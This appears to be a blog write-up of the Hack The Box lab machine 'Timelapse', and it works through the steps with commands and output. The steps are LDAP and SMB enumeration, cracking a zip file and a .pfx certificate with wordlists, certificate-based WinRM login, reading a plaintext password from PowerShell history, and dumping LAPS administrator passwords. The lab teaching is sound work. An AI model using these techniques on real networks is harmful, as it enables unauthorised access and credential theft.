---
title: "Hack The Box Timelapse - Writeup"
draft: false
categories:
- htb
tags:
- htb
- hacking
date: 2022-03-29
---

Timelapse is an easy difficulty Hack The Box machine. We will be abusing p12 certs, LAPS, etc.
## Nmap Scan

```bash
> nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn <IP> -oG allPorts

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-03-27 05:40:20Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49687/tcp open  msrpc             Microsoft Windows RPC
59512/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

Let's enumarate

```bash
> nmap -p389 --script ldap-rootdse <IP>

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 19:04 EDT
Nmap scan report for <IP>
Host is up (0.36s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=timelapse,DC=htb
|       ldapServiceName: timelapse.htb:dc01$@TIMELAPSE.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: DC=timelapse,DC=htb
|       namingContexts: CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=timelapse,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=timelapse,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 135273
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb
|       dnsHostName: dc01.timelapse.htb
|       defaultNamingContext: DC=timelapse,DC=htb
|       currentTime: 20220327070426.0Z
|_      configurationNamingContext: CN=Configuration,DC=timelapse,DC=htb
Service Info: Host: DC01; OS: Windows

> ldapsearch -x -h <IP> -s base namingContexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=timelapse,DC=htb
namingContexts: CN=Configuration,DC=timelapse,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
namingContexts: DC=DomainDnsZones,DC=timelapse,DC=htb
namingContexts: DC=ForestDnsZones,DC=timelapse,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

> enum4linux <IP>                                                                                                     
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 27 21:10:25 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... <IP>
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on <IP>    |
 ==================================================== 
[E] Can not find workgroup/domain


 ============================================ 
|    Nbtstat Information for <IP>    |
 ============================================ 
Looking up status of <IP>
No reply from <IP>

 ===================================== 
|    Session Check on <IP>    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server <IP> allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for <IP>    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: TIMELAPSE
Domain Sid: S-1-5-21-671920749-559770252-3318990721
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on <IP>    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for <IP> from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for <IP> from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on <IP>    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Could not find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Could not find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on <IP>    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to <IP> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment

Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on <IP>

 ==================================================== 
|    Password Policy Information for <IP>    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to <IP> using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:<IP>)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on <IP>    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on <IP> via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Could not get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for <IP>    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sun Mar 27 21:10:45 2022
```

## User - Low privileges

### SMB Share

```bash
> smbclient -L <IP>
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment

        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share

> smbclient //<IP>/Shares
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
```

We will find some files inside those directories:

- HelpDesk:
  - LAPS (multiple files)

- Dev:
  - winrm_backup.zip
  
Let's crack the zip, we can use fcrackzip or zip2john for that.

```bash
> fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
PASSWORD FOUND!!!!: pw == supremelegacy
```

We will get a .pfx file, so doing a little bit of research we can find useful resources like:

- [Certificate (password-less) based authentication in WinRM](http://www.hurryupandwait.io/blog/certificate-password-less-based-authentication-in-winrm)
- [Windows authentication without passwords in OpenStack](https://cloudbase.it/windows-without-passwords-in-openstack/)

Then we will need to crack legacyy_dev_auth.pfx. I used [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) for that.

```bash
> pfx2john legacyy_dev_auth.pfx | john --wordlist=/usr/share/wordlists/rockyou.txt /dev/stdin

Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
thuglegacy       (legacyy_dev_auth.pfx)
```

```bash
> openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.pem
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

> openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
Enter Import Password:

> openssl rsa -in private.pem -out private-dec.pem
Enter pass phrase for private.pem:
writing RSA key

> ls
cert.crt  private-dec.pem  winrm_backup.zip  legacyy_dev_auth.pfx  private.pem
```

Now we can use evil-winrm and get the user flag:

```bash
> evil-winrm -i <IP> -u legacyy -k $PWD/private-dec.pem -c $PWD/cert.crt -p '' -S

Evil-WinRM shell v3.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\legacyy\desktop> ls

Directory: C:\Users\legacyy\desktop
Mode          LastWriteTime                   Length Name
ar            3/25/2022   1:41 PM             34 user.txt

*Evil-WinRM* PS C:\Users\legacyy\desktop> cat user.txt
166f2015aeae2199676f67a86750ba3f
```

## Root
You can find the same path, using winpeas for example, but it's faster to check the PowerShell/CMD history to check what can we find there.

```bash
*Evil-WinRM* PS C:\Users\legacyy\desktop> cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.
whoami
ipconfig /all
netstat -ano | select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Cool! Let's connect as svc_deploy using evil-winrm again:

```bash
> evil-winrm --ssl -u 'svc_deploy' -i <IP> -p 'E3R$Q62^12p7PLlC%KWaxuaV'

Evil-WinRM shell v3.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

The files about LAPS we found in SMB are already a hint at this point. The password changes every time, but we can export the current one.

- [Export LAPS passwords powershell](https://smarthomepursuits.com/export-laps-passwords-powershell/)

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> $Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> $Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

Name  DnsHostName        ms-Mcs-AdmPwd            ms-Mcs-AdmPwdExpirationTime
WEB01
DEV01
DB01
DC01  dc01.timelapse.htb <PASSWORD_WILL_GO_HERE> <AdmPwdExpirationTime>
```

We can connect now as administrator using evil-winrm again.

```bash
> evil-winrm --ssl -u 'administrator' -i <IP> -p 'PASSWORD_WILL_GO_HERE'

Evil-WinRM shell v3.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\TRX\desktop\root.txt
37dcd487a3eec35ae5ee10d72003bb27
```

Summary:

- ldap enum
- smb share enum
- zip crack
- p12 cert password crack
- Certificate based auth in WinRM
- Powershell/CMD history
- "Abuse LAPS" with the powershell commands to get ADCComputer Properties credentials

![](/posts/Write-Ups/htb-timelapse/pwned.png)
